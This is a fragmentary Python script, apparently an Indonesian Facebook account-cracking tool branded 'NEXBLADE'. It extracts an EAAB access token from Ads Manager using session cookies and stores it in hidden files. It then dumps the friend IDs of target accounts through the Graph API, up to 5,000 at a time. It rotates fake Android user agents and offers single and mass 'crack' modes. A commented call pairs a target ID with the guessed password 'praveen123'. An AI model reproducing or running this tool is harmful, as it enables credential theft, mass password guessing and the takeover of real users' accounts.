...
###---[ANGGAP INI LOGO ]---###
def logo(n):
	return str(f"""      _  _ _____  _____ _      _   ___  ___ 
 | \| | __\ \/ / _ ) |    /_\ |   \| __|
 | .` | _| >  <| _ \ |__ / _ \| |) | _| 
 |_|\_|___/_/\_\___/____/_/ \_\___/|___|
                                                     """)
def logo2():
	return str(f"""      _  _ _____  _____ _      _   ___  ___ 
 | \| | __\ \/ / _ ) |    /_\ |   \| __|
...
for xd in range(10000):
    ...
    strvgt4 = f"Mozilla/5.0 (Linux; Android {str(rr(1,20))}; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Mobile Safari/537.36"        
...
def login():
	...
	try:
		...
		response = ses.get('https://www.facebook.com/adsmanager/manage/campaigns', cookies = cok).text
		nav_source = re.search('act=(.*?)&nav_source', str(response)).group(1)
		response2 = ses.get('https://web.facebook.com/adsmanager/manage/campaigns?act={}&nav_source=no_referrer'.format(nav_source), cookies = cok).text
		token_eaab = re.search('(EAAB\w+)', str(response2)).group(1)
		open('.token.txt','w').write(token)
		open('.token_eaab.txt', 'w').write(token_eaab)
		back()
...
def menu(n,t,c):
    ...
    if ask in ['1','01']:
        print(f'{P}')
        uid = input('  MASUKAN ID NYA: ').split(',')
        for x in uid:
            nge_krek2(x, '')
    elif ask in ['2','02']:
        crack_masal(t,c)
        ...
        sys.exit(f" [{M}>{P}] isi yang benar")
    else:
        sys.exit(f" [{M}>{P}] isi yang benar")
def nge_krek2(uidz , after):
    try:
        tok = open('.token_eaab.txt','r').read()
        cok = {'cookie':open('.cookie.txt','r').read()}
    except IOError:
        exit()
    try:
        if len(id)==0:
        ...
        for x in po['friends']['data']:
            ...
            print("  SEDAANG NGUMPULIN ID HARAP SABAR : "+str(len(id)) , end = '\r') 
...
def crack_publik(t,c):
	...
	try:
		bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(id,name).limit(5000)&access_token={open(".token_eaab.txt", "r").read()}',cookies=c).json()
...
def crack_masal(t,c):
    ...
    for bz in range(apa):
    	...
    	try:
    		bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(name,id).limit(5000)&access_token={open(".token_eaab.txt", "r").read()}',cookies=c).json()
    		for pi in bas['friends']['data']:
    		      try:dump.append(pi['username']+'|'+pi['name'])
    		      except:dump.append(pi['id']+'|'+pi['name'])
    		      print('\r sedang dump %s id'%(len(dump)),end=" ")
...
if __name__=='__main__':
	#crack('100032244910929',['praveen123'],'m.facebook.com',datetime.now())
	make()	